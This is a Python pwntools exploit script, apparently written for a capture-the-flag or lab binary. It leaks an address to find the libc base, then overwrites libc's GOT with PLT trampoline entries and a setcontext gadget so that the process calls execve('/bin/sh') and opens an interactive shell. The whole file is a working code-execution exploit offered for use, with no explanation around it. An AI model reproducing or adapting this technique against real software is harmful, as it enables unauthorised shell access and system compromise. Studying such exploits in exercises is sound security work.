from pwn import *
def liteContext(src: int,rsp=0,rbx=0,
    rbp=0,rsi=0,rdi=0,rcx=0,
    rdx=0,rip=0xDEADBEEF,) -> bytearray:
    b = bytearray(0x200)
    b[0x68:0x70] = p64(rdi)
    b[0x70:0x78] = p64(rsi)
    b[0x78:0x80] = p64(rbp)
    b[0x80:0x88] = p64(rbx)
    b[0x88:0x90] = p64(rdx)
    b[0x98:0xA0] = p64(rcx)
    b[0xA8:0xB0] = p64(rip)
    b[0xA0:0xA8] = p64(rsp)
    b[0xE0:0xE8] = p64(src)  # fldenv ptr
    # b[0x1C0:0x1C8] = p64(0x1F80)  # ldmxcsr == 0
    return b

def fx0(libc: ELF,nudge = 8, **kwargs) -> (int, bytes):
    # nudge is used to make sure ldmxcsr == 0, 
    # aka [got + 0x1c8-0x68 + nudge + 0x1c0] == 0
    got = libc.address + libc.dynamic_value_by_tag("DT_PLTGOT")
    plt_trampoline = libc.address + libc.get_section_by_name(".plt").header.sh_addr
    info(hex(plt_trampoline))
    return got+8, flat(
        p64(got + 0x1c8-0x68 + nudge), # Make sure ldmxcsr==0
        p64(libc.symbols["setcontext"] + 32),
        p64(plt_trampoline) * 0x36,
        liteContext(libc.sym["execve"], rsp=libc.symbols["environ"] + 8, **kwargs)[0x68-nudge:0xe8])

context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
libc    = ELF("/lib/x86_64-linux-gnu/libc.so.6")
p       = process("../main")
# gdb.attach(p,'b *0x7ffff7c2c000')
base = int(p.readline(),16) - (0x7ff6a25244a0-0x7ff6a24c8000) - 0x4250
libc.address=base
dest, payload = fx0(
    libc, rip=libc.sym["execve"], rdi=libc.search(b"/bin/sh").__next__()
)
success(hex(len(payload)))
plt0 = libc.address + libc.get_section_by_name(".plt").header.sh_addr
context.arch='amd64'
p.send(p64(dest))
p.send(p64(len(payload)))
p.send(payload)
p.interactive()